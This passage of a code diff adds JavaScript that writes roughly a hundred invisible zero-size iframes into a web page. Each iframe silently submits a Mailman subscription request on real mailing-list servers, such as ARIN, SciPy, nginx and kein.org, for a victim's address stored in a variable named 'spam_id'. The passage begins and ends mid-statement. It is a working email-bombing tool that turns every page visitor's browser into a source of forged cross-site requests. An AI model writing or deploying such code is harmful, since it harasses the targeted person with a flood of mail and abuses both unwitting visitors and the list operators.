+            "&fullname=&pw=123456789&pw-conf=123456789&language=en&digest=0&email-button=Subscribe' width='0' height='0'></iframe>"
+        );
+        document.write(
+          "<iframe frameborder='0' src='http://lists.arin.net/mailman/subscribe/arin-discuss?email=" +
+            spam_id +
+            "&fullname=&pw=123456789&pw-conf=123456789&language=en&digest=0&email-button=Subscribe' width='0' height='0'></iframe>"
+        );
+        document.write(
+          "<iframe frameborder='0' src='http://lists.arin.net/mailman/subscribe/arin-issued?email=" +
+            spam_id +
+            "&fullname=&pw=123456789&pw-conf=123456789&language=en&digest=0&email-button=Subscribe' width='0' height='0'></iframe>"
+        );
+        document.write(
+          "<iframe frameborder='0' src='http://lists.arin.net/mailman/subscribe/arin-ppml?email=" +
+            spam_id +
+            "&fullname=&pw=123456789&pw-conf=123456789&language=en&digest=0&email-button=Subscribe' width='0' height='0'></iframe>"
+        );
+        document.write(
+          "<iframe frameborder='0' src='http://lists.arin.net/mailman/subscribe/arin-suggestions?email=" +
+            spam_id +
+            "&fullname=&pw=123456789&pw-conf=123456789&language=en&digest=0&email-button=Subscribe' width='0' height='0'></iframe>"
+        );
+        document.write(
+          "<iframe frameborder='0' src='http://lists.arin.net/mailman/subscribe/arin-tech-discuss?email=" +
+            spam_id +
+            "&fullname=&pw=123456789&pw-conf=123456789&language=en&digest=0&email-button=Subscribe' width='0' height='0'></iframe>"
+        );
+        document.write(
+          "<iframe frameborder='0' src='http://lists.arin.net/mailman/subscribe/arin-whoisrws?email=" +
+            spam_id +
+            "&fullname=&pw=123456789&pw-conf=123456789&language=en&digest=0&email-button=Subscribe' width='0' height='0'></iframe>"
+        );
+        document.write(
+          "<iframe frameborder='0' src='http://lists.arin.net/mailman/subscribe/audcom?email=" +
+            spam_id +
+            "&fullname=&pw=123456789&pw-conf=123456789&language=en&digest=0&email-button=Subscribe' width='0' height='0'></iframe>"
+        );
+        document.write(
+          "<iframe frameborder='0' src='http://lists.arin.net/mailman/subscribe/clew?email=" +
+            spam_id +
+            "&fullname=&pw=123456789&pw-conf=123456789&language=en&digest=0&email-button=Subscribe' width='0' height='0'></iframe>"
+        );
+        document.write(
+          "<iframe frameborder='0' src='http://lists.arin.net/mailman/subscribe/dbwg?email=" +
+            spam_id +
+            "&fullname=&pw=123456789&pw-conf=123456789&language=en&digest=0&email-button=Subscribe' width='0' height='0'></iframe>"
+        );
+        document.write(
+          "<iframe frameborder='0' src='http://lists.arin.net/mailman/subscribe/info?email=" +
+            spam_id +
+            "&fullname=&pw=123456789&pw-conf=123456789&language=en&digest=0&email-button=Subscribe' width='0' height='0'></iframe>"
+        );
+        document.write(
+          "<iframe frameborder='0' src='http://lists.arin.net/mailman/subscribe/meetingguests?email=" +
+            spam_id +
+            "&fullname=&pw=123456789&pw-conf=123456789&language=en&digest=0&email-button=Subscribe' width='0' height='0'></iframe>"
+        );
+        document.write(
+          "<iframe frameborder='0' src='http://lists.arin.net/mailman/subscribe/naipr?email=" +
+            spam_id +
+            "&fullname=&pw=123456789&pw-conf=123456789&language=en&digest=0&email-button=Subscribe' width='0' height='0'></iframe>"
+        );
+        document.write(
+          "<iframe frameborder='0' src='http://lists.arin.net/mailman/subscribe/nrpm-edit?email=" +
+            spam_id +
+            "&fullname=&pw=123456789&pw-conf=123456789&language=en&digest=0&email-button=Subscribe' width='0' height='0'></iframe>"
+        );
+        document.write(
+          "<iframe frameborder='0' src='http://lists.arin.net/mailman/subscribe/nrr-blueprint?email=" +
+            spam_id +
+            "&fullname=&pw=123456789&pw-conf=123456789&language=en&digest=0&email-button=Subscribe' width='0' height='0'></iframe>"
+        );
+        document.write(
+          "<iframe frameborder='0' src='http://lists.arin.net/mailman/subscribe/policy?email=" +
+            spam_id +
+            "&fullname=&pw=123456789&pw-conf=123456789&language=en&digest=0&email-button=Subscribe' width='0' height='0'></iframe>"
+        );
+        document.write(
+          "<iframe frameborder='0' src='http://lists.arin.net/mailman/subscribe/rtma?email=" +
+            spam_id +
+            "&fullname=&pw=123456789&pw-conf=123456789&language=en&digest=0&email-button=Subscribe' width='0' height='0'></iframe>"
+        );
+        document.write(
+          "<iframe frameborder='0' src='http://lists.arin.net/mailman/subscribe/v6wg?email=" +
+            spam_id +
+            "&fullname=&pw=123456789&pw-conf=123456789&language=en&digest=0&email-button=Subscribe' width='0' height='0'></iframe>"
+        );
+        document.write(
+          "<iframe frameborder='0' src='http://lists.arin.net/mailman/subscribe/vwp?email=" +
+            spam_id +
+            "&fullname=&pw=123456789&pw-conf=123456789&language=en&digest=0&email-button=Subscribe' width='0' height='0'></iframe>"
+        );
+        document.write(
+          "<iframe frameborder='0' src='http://www.wplug.org/mailman/subscribe/wplug-jobs?email=" +
+            spam_id +
+            "&fullname=&pw=123456789&pw-conf=123456789&language=en&digest=0&email-button=Subscribe' width='0' height='0'></iframe>"
+        );
+        document.write(
+          "<iframe frameborder='0' src='http://www.open-std.org/mailman/subscribe/ub?email=" +
+            spam_id +
+            "&fullname=&pw=123456789&pw-conf=123456789&language=en&digest=0&email-button=Subscribe' width='0' height='0'></iframe>"
+        );
+        document.write(
+          "<iframe frameborder='0' src='http://mail.etree.org/mailman/subscribe/etrade?email=" +
+            spam_id +
+            "&fullname=&pw=123456789&pw-conf=123456789&language=en&digest=0&email-button=Subscribe' width='0' height='0'></iframe>"
+        );
+        document.write(
+          "<iframe frameborder='0' src='https://listen.jpberlin.de/mailman/subscribe/dhv-info?email=" +
+            spam_id +
+            "&fullname=&pw=123456789&pw-conf=123456789&language=en&digest=0&email-button=Subscribe' width='0' height='0'></iframe>"
+        );
+        document.write(
+          "<iframe frameborder='0' src='http://gator2004.hostgator.com/mailman/subscribe/gossip_queensoflasvegas.com?email=" +
+            spam_id +
+            "&fullname=&pw=123456789&pw-conf=123456789&language=en&digest=0&email-button=Subscribe' width='0' height='0'></iframe>"
+        );
+        document.write(
+          "<iframe frameborder='0' src='http://noticias.livio.com/mailman/subscribe/notird_noticias.livio.com?email=" +
+            spam_id +
+            "&fullname=&pw=123456789&pw-conf=123456789&language=en&digest=0&email-button=Subscribe' width='0' height='0'></iframe>"
+        );
+        document.write(
+          "<iframe frameborder='0' src='http://developer.marklogic.com/mailman/subscribe/commits?email=" +
+            spam_id +
+            "&fullname=&pw=123456789&pw-conf=123456789&language=en&digest=0&email-button=Subscribe' width='0' height='0'></iframe>"
+        );
+        document.write(
+          "<iframe frameborder='0' src='http://developer.marklogic.com/mailman/subscribe/corona?email=" +
+            spam_id +
+            "&fullname=&pw=123456789&pw-conf=123456789&language=en&digest=0&email-button=Subscribe' width='0' height='0'></iframe>"
+        );
+        document.write(
+          "<iframe frameborder='0' src='http://developer.marklogic.com/mailman/subscribe/general?email=" +
+            spam_id +
+            "&fullname=&pw=123456789&pw-conf=123456789&language=en&digest=0&email-button=Subscribe' width='0' height='0'></iframe>"
+        );
+        document.write(
+          "<iframe frameborder='0' src='http://developer.marklogic.com/mailman/subscribe/roxy?email=" +
+            spam_id +
+            "&fullname=&pw=123456789&pw-conf=123456789&language=en&digest=0&email-button=Subscribe' width='0' height='0'></iframe>"
+        );
+        document.write(
+          "<iframe frameborder='0' src='http://list.webaim.org/mailman/subscribe/webaim-forum?email=" +
+            spam_id +
+            "&fullname=&pw=123456789&pw-conf=123456789&language=en&digest=0&email-button=Subscribe' width='0' height='0'></iframe>"
+        );
+        document.write(
+          "<iframe frameborder='0' src='http://lists.copyleft.no/mailman/subscribe/gatasp-nyhetsbrev?email=" +
+            spam_id +
+            "&fullname=&pw=123456789&pw-conf=123456789&language=en&digest=0&email-button=Subscribe' width='0' height='0'></iframe>"
+        );
+        document.write(
+          "<iframe frameborder='0' src='http://www.orcas.net/mailman/subscribe/krahnos?email=" +
+            spam_id +
+            "&fullname=&pw=123456789&pw-conf=123456789&language=en&digest=0&email-button=Subscribe' width='0' height='0'></iframe>"
+        );
+        document.write(
+          "<iframe frameborder='0' src='http://www.orcas.net/mailman/subscribe/lasvegasfur?email=" +
+            spam_id +
+            "&fullname=&pw=123456789&pw-conf=123456789&language=en&digest=0&email-button=Subscribe' width='0' height='0'></iframe>"
+        );
+        document.write(
+          "<iframe frameborder='0' src='http://www.orcas.net/mailman/subscribe/networkoperations?email=" +
+            spam_id +
+            "&fullname=&pw=123456789&pw-conf=123456789&language=en&digest=0&email-button=Subscribe' width='0' height='0'></iframe>"
+        );
+        document.write(
+          "<iframe frameborder='0' src='http://lists.randombit.net/mailman/subscribe/botan-announce?email=" +
+            spam_id +
+            "&fullname=&pw=123456789&pw-conf=123456789&language=en&digest=0&email-button=Subscribe' width='0' height='0'></iframe>"
+        );
+        document.write(
+          "<iframe frameborder='0' src='http://lists.randombit.net/mailman/subscribe/botan-devel?email=" +
+            spam_id +
+            "&fullname=&pw=123456789&pw-conf=123456789&language=en&digest=0&email-button=Subscribe' width='0' height='0'></iframe>"
+        );
+        document.write(
+          "<iframe frameborder='0' src='http://lists.randombit.net/mailman/subscribe/cryptography?email=" +
+            spam_id +
+            "&fullname=&pw=123456789&pw-conf=123456789&language=en&digest=0&email-button=Subscribe' width='0' height='0'></iframe>"
+        );
+        document.write(
+          "<iframe frameborder='0' src='http://lists.randombit.net/mailman/subscribe/cryptopolitics?email=" +
+            spam_id +
+            "&fullname=&pw=123456789&pw-conf=123456789&language=en&digest=0&email-button=Subscribe' width='0' height='0'></iframe>"
+        );
+        document.write(
+          "<iframe frameborder='0' src='http://mail.scipy.org/mailman/subscribe/announce?email=" +
+            spam_id +
+            "&fullname=&pw=123456789&pw-conf=123456789&language=en&digest=0&email-button=Subscribe' width='0' height='0'></iframe>"
+        );
+        document.write(
+          "<iframe frameborder='0' src='http://mail.scipy.org/mailman/subscribe/apug?email=" +
+            spam_id +
+            "&fullname=&pw=123456789&pw-conf=123456789&language=en&digest=0&email-button=Subscribe' width='0' height='0'></iframe>"
+        );
+        document.write(
+          "<iframe frameborder='0' src='http://mail.scipy.org/mailman/subscribe/astropy?email=" +
+            spam_id +
+            "&fullname=&pw=123456789&pw-conf=123456789&language=en&digest=0&email-button=Subscribe' width='0' height='0'></iframe>"
+        );
+        document.write(
+          "<iframe frameborder='0' src='http://mail.scipy.org/mailman/subscribe/ipython-dev?email=" +
+            spam_id +
+            "&fullname=&pw=123456789&pw-conf=123456789&language=en&digest=0&email-button=Subscribe' width='0' height='0'></iframe>"
+        );
+        document.write(
+          "<iframe frameborder='0' src='http://mail.scipy.org/mailman/subscribe/ipython-user?email=" +
+            spam_id +
+            "&fullname=&pw=123456789&pw-conf=123456789&language=en&digest=0&email-button=Subscribe' width='0' height='0'></iframe>"
+        );
+        document.write(
+          "<iframe frameborder='0' src='http://mail.scipy.org/mailman/subscribe/mailman?email=" +
+            spam_id +
+            "&fullname=&pw=123456789&pw-conf=123456789&language=en&digest=0&email-button=Subscribe' width='0' height='0'></iframe>"
+        );
+        document.write(
+          "<iframe frameborder='0' src='http://mail.scipy.org/mailman/subscribe/nipy-devel?email=" +
+            spam_id +
+            "&fullname=&pw=123456789&pw-conf=123456789&language=en&digest=0&email-button=Subscribe' width='0' height='0'></iframe>"
+        );
+        document.write(
+          "<iframe frameborder='0' src='http://mail.scipy.org/mailman/subscribe/numpy-discussion?email=" +
+            spam_id +
+            "&fullname=&pw=123456789&pw-conf=123456789&language=en&digest=0&email-button=Subscribe' width='0' height='0'></iframe>"
+        );
+        document.write(
+          "<iframe frameborder='0' src='http://mail.scipy.org/mailman/subscribe/numpy-refactor?email=" +
+            spam_id +
+            "&fullname=&pw=123456789&pw-conf=123456789&language=en&digest=0&email-button=Subscribe' width='0' height='0'></iframe>"
+        );
+        document.write(
+          "<iframe frameborder='0' src='http://mail.scipy.org/mailman/subscribe/numpy-refactor-git?email=" +
+            spam_id +
+            "&fullname=&pw=123456789&pw-conf=123456789&language=en&digest=0&email-button=Subscribe' width='0' height='0'></iframe>"
+        );
+        document.write(
+          "<iframe frameborder='0' src='http://mail.scipy.org/mailman/subscribe/numpy-svn?email=" +
+            spam_id +
+            "&fullname=&pw=123456789&pw-conf=123456789&language=en&digest=0&email-button=Subscribe' width='0' height='0'></iframe>"
+        );
+        document.write(
+          "<iframe frameborder='0' src='http://mail.scipy.org/mailman/subscribe/numpy-tickets?email=" +
+            spam_id +
+            "&fullname=&pw=123456789&pw-conf=123456789&language=en&digest=0&email-button=Subscribe' width='0' height='0'></iframe>"
+        );
+        document.write(
+          "<iframe frameborder='0' src='http://mail.scipy.org/mailman/subscribe/pyxg?email=" +
+            spam_id +
+            "&fullname=&pw=123456789&pw-conf=123456789&language=en&digest=0&email-button=Subscribe' width='0' height='0'></iframe>"
+        );
+        document.write(
+          "<iframe frameborder='0' src='http://mail.scipy.org/mailman/subscribe/scipy-dev?email=" +
+            spam_id +
+            "&fullname=&pw=123456789&pw-conf=123456789&language=en&digest=0&email-button=Subscribe' width='0' height='0'></iframe>"
+        );
+        document.write(
+          "<iframe frameborder='0' src='http://mail.scipy.org/mailman/subscribe/scipy-svn?email=" +
+            spam_id +
+            "&fullname=&pw=123456789&pw-conf=123456789&language=en&digest=0&email-button=Subscribe' width='0' height='0'></iframe>"
+        );
+        document.write(
+          "<iframe frameborder='0' src='http://mail.scipy.org/mailman/subscribe/scipy-tickets?email=" +
+            spam_id +
+            "&fullname=&pw=123456789&pw-conf=123456789&language=en&digest=0&email-button=Subscribe' width='0' height='0'></iframe>"
+        );
+        document.write(
+          "<iframe frameborder='0' src='http://mail.scipy.org/mailman/subscribe/scipy-user?email=" +
+            spam_id +
+            "&fullname=&pw=123456789&pw-conf=123456789&language=en&digest=0&email-button=Subscribe' width='0' height='0'></iframe>"
+        );
+        document.write(
+          "<iframe frameborder='0' src='http://mail.kein.org/mailman/subscribe/maad-l?email=" +
+            spam_id +
+            "&fullname=&pw=123456789&pw-conf=123456789&language=en&digest=0&email-button=Subscribe' width='0' height='0'></iframe>"
+        );
+        document.write(
+          "<iframe frameborder='0' src='http://mail.kein.org/mailman/subscribe/a+m-intern?email=" +
+            spam_id +
+            "&fullname=&pw=123456789&pw-conf=123456789&language=en&digest=0&email-button=Subscribe' width='0' height='0'></iframe>"
+        );
+        document.write(
+          "<iframe frameborder='0' src='http://mail.kein.org/mailman/subscribe/act-l?email=" +
+            spam_id +
+            "&fullname=&pw=123456789&pw-conf=123456789&language=en&digest=0&email-button=Subscribe' width='0' height='0'></iframe>"
+        );
+        document.write(
+          "<iframe frameborder='0' src='http://mail.kein.org/mailman/subscribe/archipelago-l?email=" +
+            spam_id +
+            "&fullname=&pw=123456789&pw-conf=123456789&language=en&digest=0&email-button=Subscribe' width='0' height='0'></iframe>"
+        );
+        document.write(
+          "<iframe frameborder='0' src='http://mail.kein.org/mailman/subscribe/cc?email=" +
+            spam_id +
+            "&fullname=&pw=123456789&pw-conf=123456789&language=en&digest=0&email-button=Subscribe' width='0' height='0'></iframe>"
+        );
+        document.write(
+          "<iframe frameborder='0' src='http://mail.kein.org/mailman/subscribe/concept-persons?email=" +
+            spam_id +
+            "&fullname=&pw=123456789&pw-conf=123456789&language=en&digest=0&email-button=Subscribe' width='0' height='0'></iframe>"
+        );
+        document.write(
+          "<iframe frameborder='0' src='http://mail.kein.org/mailman/subscribe/eflux2?email=" +
+            spam_id +
+            "&fullname=&pw=123456789&pw-conf=123456789&language=en&digest=0&email-button=Subscribe' width='0' height='0'></iframe>"
+        );
+        document.write(
+          "<iframe frameborder='0' src='http://mail.kein.org/mailman/subscribe/extra-l?email=" +
+            spam_id +
+            "&fullname=&pw=123456789&pw-conf=123456789&language=en&digest=0&email-button=Subscribe' width='0' height='0'></iframe>"
+        );
+        document.write(
+          "<iframe frameborder='0' src='http://mail.kein.org/mailman/subscribe/frankfurt-l?email=" +
+            spam_id +
+            "&fullname=&pw=123456789&pw-conf=123456789&language=en&digest=0&email-button=Subscribe' width='0' height='0'></iframe>"
+        );
+        document.write(
+          "<iframe frameborder='0' src='http://mail.kein.org/mailman/subscribe/gsr-l?email=" +
+            spam_id +
+            "&fullname=&pw=123456789&pw-conf=123456789&language=en&digest=0&email-button=Subscribe' width='0' height='0'></iframe>"
+        );
+        document.write(
+          "<iframe frameborder='0' src='http://mail.kein.org/mailman/subscribe/incom-edit?email=" +
+            spam_id +
+            "&fullname=&pw=123456789&pw-conf=123456789&language=en&digest=0&email-button=Subscribe' width='0' height='0'></iframe>"
+        );
+        document.write(
+          "<iframe frameborder='0' src='http://mail.kein.org/mailman/subscribe/gsr-l?email=" +
+            spam_id +
+            "&fullname=&pw=123456789&pw-conf=123456789&language=en&digest=0&email-button=Subscribe' width='0' height='0'></iframe>"
+        );
+        document.write(
+          "<iframe frameborder='0' src='http://mail.kein.org/mailman/subscribe/keshma?email=" +
+            spam_id +
+            "&fullname=&pw=123456789&pw-conf=123456789&language=en&digest=0&email-button=Subscribe' width='0' height='0'></iframe>"
+        );
+        document.write(
+          "<iframe frameborder='0' src='http://mail.kein.org/mailman/subscribe/lz-l?email=" +
+            spam_id +
+            "&fullname=&pw=123456789&pw-conf=123456789&language=en&digest=0&email-button=Subscribe' width='0' height='0'></iframe>"
+        );
+        document.write(
+          "<iframe frameborder='0' src='http://mail.kein.org/mailman/subscribe/migrar-ffm?email=" +
+            spam_id +
+            "&fullname=&pw=123456789&pw-conf=123456789&language=en&digest=0&email-button=Subscribe' width='0' height='0'></iframe>"
+        );
+        document.write(
+          "<iframe frameborder='0' src='http://mail.kein.org/mailman/subscribe/mir-l?email=" +
+            spam_id +
+            "&fullname=&pw=123456789&pw-conf=123456789&language=en&digest=0&email-button=Subscribe' width='0' height='0'></iframe>"
+        );
+        document.write(
+          "<iframe frameborder='0' src='http://mail.kein.org/mailman/subscribe/missinginfo?email=" +
+            spam_id +
+            "&fullname=&pw=123456789&pw-conf=123456789&language=en&digest=0&email-button=Subscribe' width='0' height='0'></iframe>"
+        );
+        document.write(
+          "<iframe frameborder='0' src='http://mail.kein.org/mailman/subscribe/mode05-info?email=" +
+            spam_id +
+            "&fullname=&pw=123456789&pw-conf=123456789&language=en&digest=0&email-button=Subscribe' width='0' height='0'></iframe>"
+        );
+        document.write(
+          "<iframe frameborder='0' src='http://mail.kein.org/mailman/subscribe/movisat?email=" +
+            spam_id +
+            "&fullname=&pw=123456789&pw-conf=123456789&language=en&digest=0&email-button=Subscribe' width='0' height='0'></iframe>"
+        );
+        document.write(
+          "<iframe frameborder='0' src='http://mail.kein.org/mailman/subscribe/neuro-l?email=" +
+            spam_id +
+            "&fullname=&pw=123456789&pw-conf=123456789&language=en&digest=0&email-button=Subscribe' width='0' height='0'></iframe>"
+        );
+        document.write(
+          "<iframe frameborder='0' src='http://mail.kein.org/mailman/subscribe/organizing-l?email=" +
+            spam_id +
+            "&fullname=&pw=123456789&pw-conf=123456789&language=en&digest=0&email-button=Subscribe' width='0' height='0'></iframe>"
+        );
+        document.write(
+          "<iframe frameborder='0' src='http://mail.kein.org/mailman/subscribe/pgainfo-l?email=" +
+            spam_id +
+            "&fullname=&pw=123456789&pw-conf=123456789&language=en&digest=0&email-button=Subscribe' width='0' height='0'></iframe>"
+        );
+        document.write(
+          "<iframe frameborder='0' src='http://mail.kein.org/mailman/subscribe/strub-huillet?email=" +
+            spam_id +
+            "&fullname=&pw=123456789&pw-conf=123456789&language=en&digest=0&email-button=Subscribe' width='0' height='0'></iframe>"
+        );
+        document.write(
+          "<iframe frameborder='0' src='http://mail.kein.org/mailman/subscribe/subtext-l?email=" +
+            spam_id +
+            "&fullname=&pw=123456789&pw-conf=123456789&language=en&digest=0&email-button=Subscribe' width='0' height='0'></iframe>"
+        );
+        document.write(
+          "<iframe frameborder='0' src='http://mail.kein.org/mailman/subscribe/syndikat-ost?email=" +
+            spam_id +
+            "&fullname=&pw=123456789&pw-conf=123456789&language=en&digest=0&email-button=Subscribe' width='0' height='0'></iframe>"
+        );
+        document.write(
+          "<iframe frameborder='0' src='http://mail.kein.org/mailman/subscribe/tarifa-l?email=" +
+            spam_id +
+            "&fullname=&pw=123456789&pw-conf=123456789&language=en&digest=0&email-button=Subscribe' width='0' height='0'></iframe>"
+        );
+        document.write(
+          "<iframe frameborder='0' src='http://mail.kein.org/mailman/subscribe/transfiction?email=" +
+            spam_id +
+            "&fullname=&pw=123456789&pw-conf=123456789&language=en&digest=0&email-button=Subscribe' width='0' height='0'></iframe>"
+        );
+        document.write(
+          "<iframe frameborder='0' src='http://mail.kein.org/mailman/subscribe/tuesday-l?email=" +
+            spam_id +
+            "&fullname=&pw=123456789&pw-conf=123456789&language=en&digest=0&email-button=Subscribe' width='0' height='0'></iframe>"
+        );
+        document.write(
+          "<iframe frameborder='0' src='http://mail.kein.org/mailman/subscribe/update?email=" +
+            spam_id +
+            "&fullname=&pw=123456789&pw-conf=123456789&language=en&digest=0&email-button=Subscribe' width='0' height='0'></iframe>"
+        );
+        document.write(
+          "<iframe frameborder='0' src='http://mail.kein.org/mailman/subscribe/v2v-server?email=" +
+            spam_id +
+            "&fullname=&pw=123456789&pw-conf=123456789&language=en&digest=0&email-button=Subscribe' width='0' height='0'></iframe>"
+        );
+        document.write(
+          "<iframe frameborder='0' src='http://mail.kein.org/mailman/subscribe/vim-colloquium?email=" +
+            spam_id +
+            "&fullname=&pw=123456789&pw-conf=123456789&language=en&digest=0&email-button=Subscribe' width='0' height='0'></iframe>"
+        );
+        document.write(
+          "<iframe frameborder='0' src='http://mail.kein.org/mailman/subscribe/vim-preview?email=" +
+            spam_id +
+            "&fullname=&pw=123456789&pw-conf=123456789&language=en&digest=0&email-button=Subscribe' width='0' height='0'></iframe>"
+        );
+        document.write(
+          "<iframe frameborder='0' src='http://mail.kein.org/mailman/subscribe/wmg-info?email=" +
+            spam_id +
+            "&fullname=&pw=123456789&pw-conf=123456789&language=en&digest=0&email-button=Subscribe' width='0' height='0'></iframe>"
+        );
+        document.write(
+          "<iframe frameborder='0' src='http://mail.kein.org/mailman/subscribe/yoi-l?email=" +
+            spam_id +
+            "&fullname=&pw=123456789&pw-conf=123456789&language=en&digest=0&email-button=Subscribe' width='0' height='0'></iframe>"
+        );
+        document.write(
+          "<iframe frameborder='0' src='http://mailman.nginx.org/mailman/subscribe/nginx?email=" +
+            spam_id +
+            "&fullname=&pw=123456789&pw-conf=123456789&language=en&digest=0&email-button=Subscribe' width='0' height='0'></iframe>"
+        );
+        document.write(
+          "<iframe frameborder='0' src='http://mailman.nginx.org/mailman/subscribe/nginx-announce?email=" +
+            spam_id +
+            "&fullname=&pw=123456789&pw-conf=123456789&language=en&digest=0&email-button=Subscribe' width='0' height='0'></iframe>"
+        );
+        document.write(
+          "<iframe frameborder='0' src='http://mailman.nginx.org/mailman/subscribe/nginx-devel?email=" +
+            spam_id +
+            "&fullname=&pw=123456789&pw-conf=123456789&language=en&digest=0&email-button=Subscribe' width='0' height='0'></iframe>"
+        );
+        document.write(
+          "<iframe frameborder='0' src='http://mailman.nginx.org/mailman/subscribe/nginx-ru?email=" +
+            spam_id +
+            "&fullname=&pw=123456789&pw-conf=123456789&language=en&digest=0&email-button=Subscribe' width='0' height='0'></iframe>"
+        );
+        document.write(
+          "<iframe frameborder='0' src='http://mailman.nginx.org/mailman/subscribe/nginx-ru-announce?email=" +
+            spam_id +
+            "&fullname=&pw=123456789&pw-conf=123456789&language=en&digest=0&email-button=Subscribe' width='0' height='0'></iframe>"
+        );
+        document.write(
+          "<iframe frameborder='0' src='http://audifans.com/mailman/subscribe/quattro?email=" +
+            spam_id +
+            "&fullname=&pw=123456789&pw-conf=123456789&language=en&digest=0&email-button=Subscribe' width='0' height='0'></iframe>"
+        );
+        document.write(
+          "<iframe frameborder='0' src='http://audifans.com/mailman/subscribe/200q20v?email=" +
+            spam_id +
+            "&fullname=&pw=123456789&pw-conf=123456789&language=en&digest=0&email-button=Subscribe' width='0' height='0'></iframe>"
+        );
+        document.write(
+          "<iframe frameborder='0' src='http://audifans.com/mailman/subscribe/20v?email=" +
+            spam_id +
+            "&fullname=&pw=123456789&pw-conf=123456789&language=en&digest=0&email-button=Subscribe' width='0' height='0'></iframe>"
+        );
+        document.write(
+          "<iframe frameborder='0' src='http://audifans.com/mailman/subscribe/a4?email=" +
+            spam_id +
+            "&fullname=&pw=123456789&pw-conf=123456789&language=en&digest=0&email-button=Subscribe' width='0' height='0'></iframe>"
+        );
+        document.write(
+          "<iframe frameborder='0' src='http://audifans.com/mailman/subscribe/a8?email=" +
+            spam_id +
+            "&fullname=&pw=123456789&pw-conf=123456789&language=en&digest=0&email-button=Subscribe' width='0' height='0'></iframe>"
+        );
+        document.write(
+          "<iframe frameborder='0' src='http://audifans.com/mailman/subscribe/ba-group?email=" +
+            spam_id +
+            "&fullname=&pw=123456789&pw-conf=123456789&language=en&digest=0&email-button=Subscribe' width='0' height='0'></iframe>"
+        );
+        document.write(
+          "<iframe frameborder='0' src='http://audifans.com/mailman/subscribe/biturbos4?email=" +
+            spam_id +
+            "&fullname=&pw=123456789&pw-conf=123456789&language=en&digest=0&email-button=Subscribe' width='0' height='0'></iframe>"
+        );
+        document.write(
+          "<iframe frameborder='0' src='http://audifans.com/mailman/subscribe/es2?email=" +
+            spam_id +
+            "&fullname=&pw=123456789&pw-conf=123456789&language=en&digest=0&email-button=Subscribe' width='0' height='0'></iframe>"
+        );
+        document.write(
+          "<iframe frameborder='0' src='http://audifans.com/mailman/subscribe/events?email=" +
+            spam_id +
+            "&fullname=&pw=123456789&pw-conf=123456789&language=en&digest=0&email-button=Subscribe' width='0' height='0'></iframe>"
+        );
+        document.write(
+          "<iframe frameborder='0' src='http://audifans.com/mailman/subscribe/marketplace?email=" +
+            spam_id +
+            "&fullname=&pw=123456789&pw-conf=123456789&language=en&digest=0&email-button=Subscribe' width='0' height='0'></iframe>"
+        );
+        document.write(
+          "<iframe frameborder='0' src='http://audifans.com/mailman/subscribe/offtopic?email=" +
+            spam_id +
+            "&fullname=&pw=123456789&pw-conf=123456789&language=en&digest=0&email-button=Subscribe' width='0' height='0'></iframe>"
+        );
+        document.write(
+          "<iframe frameborder='0' src='http://audifans.com/mailman/subscribe/quattro?email=" +
+            spam_id +
+            "&fullname=&pw=123456789&pw-conf=123456789&language=en&digest=0&email-button=Subscribe' width='0' height='0'></iframe>"
+        );
+        document.write(
+          "<iframe frameborder='0' src='http://audifans.com/mailman/subscribe/staff?email=" +
+            spam_id +
+            "&fullname=&pw=123456789&pw-conf=123456789&language=en&digest=0&email-button=Subscribe' width='0' height='0'></iframe>"
+        );
+        document.write(
+          "<iframe frameborder='0' src='http://audifans.com/mailman/subscribe/torsen?email=" +
+            spam_id +
+            "&fullname=&pw=123456789&pw-conf=123456789&language=en&digest=0&email-button=Subscribe' width='0' height='0'></iframe>"
+        );
+        document.write(
+          "<iframe frameborder='0' src='http://audifans.com/mailman/subscribe/tt?email=" +
+            spam_id +
+            "&fullname=&pw=123456789&pw-conf=123456789&language=en&digest=0&email-button=Subscribe' width='0' height='0'></iframe>"
+        );
+        document.write(
+          "<iframe frameborder='0' src='http://audifans.com/mailman/subscribe/urq?email=" +
+            spam_id +
+            "&fullname=&pw=123456789&pw-conf=123456789&language=en&digest=0&email-button=Subscribe' width='0' height='0'></iframe>"
+        );
+        document.write(
+          "<iframe frameborder='0' src='http://audifans.com/mailman/subscribe/v6-12v?email=" +
+            spam_id +
+            "&fullname=&pw=123456789&pw-conf=123456789&language=en&digest=0&email-button=Subscribe' width='0' height='0'></iframe>"
+        );
+        document.write(
+          "<iframe frameborder='0' src='http://audifans.com/mailman/subscribe/v8?email=" +
+            spam_id +
+            "&fullname=&pw=123456789&pw-conf=123456789&language=en&digest=0&email-button=Subscribe' width='0' height='0'></iframe>"
+        );
+        document.write(
+          "<iframe frameborder='0' src='http://audifans.com/mailman/subscribe/vwdiesel?email=" +
+            spam_id +
+            "&fullname=&pw=123456789&pw-conf=123456789&language=en&digest=0&email-button=Subscribe' width='0' height='0'></iframe>"
+        );
+        document.write(
+          "<iframe frameborder='0' src='http://list.healthnet.org/mailman/subscribe/india-drug?email=" +
+            spam_id +
+            "&fullname=&pw=123456789&pw-conf=123456789&language=en&digest=0&email-button=Subscribe' width='0' height='0'></iframe>"
+        );
+        document.write(
+          "<iframe frameborder='0' src='http://list.healthnet.org/mailman/subscribe/pronut-hiv?email=" +
+            spam_id +
+            "&fullname=&pw=123456789&pw-conf=123456789&language=en&digest=0&email-button=Subscribe' width='0' height='0'></iframe>"
+        );
+        document.write(
+          "<iframe frameborder='0' src='http://peter.petra.ac.id/cgi-bin/mailman/subscribe/dosen-ti-aktif?email=" +
+            spam_id +
+            "&fullname=&pw=123456789&pw-conf=123456789&language=en&digest=0&email-button=Subscribe' width='0' height='0'></iframe>"
+        );
+        document.write(
+          "<iframe frameborder='0' src='http://optimizationweek.com/mailman/subscribe/news_optimizationweek.com?email=" +
+            spam_id +
+            "&fullname=&pw=123456789&pw-conf=123456789&language=en&digest=0&email-button=Subscribe' width='0' height='0'></iframe>"
+        );
+        document.write(
+          "<iframe frameborder='0' src='http://lists.icpsr.umich.edu/mailman/subscribe/NCAA_student-athlete_archive?email=" +
+            spam_id +
+            "&fullname=&pw=123456789&pw-conf=123456789&language=en&digest=0&email-button=Subscribe' width='0' height='0'></iframe>"
+        );
+        document.write(
+          "<iframe frameborder='0' src='http://roadtonet.com/mailman/subscribe/westbridge-artreport_roadtonet.com?email=" +
+            spam_id +
+            "&fullname=&pw=123456789&pw-conf=123456789&language=en&digest=0&email-button=Subscribe' width='0' height='0'></iframe>"
+        );
+        document.write(
+          "<iframe frameborder='0' src='http://list.xvid.org/mailman/subscribe/xvid-announce?email=" +
+            spam_id +
+            "&fullname=&pw=123456789&pw-conf=123456789&language=en&digest=0&email-button=Subscribe' width='0' height='0'></iframe>"
+        );
+        document.write(
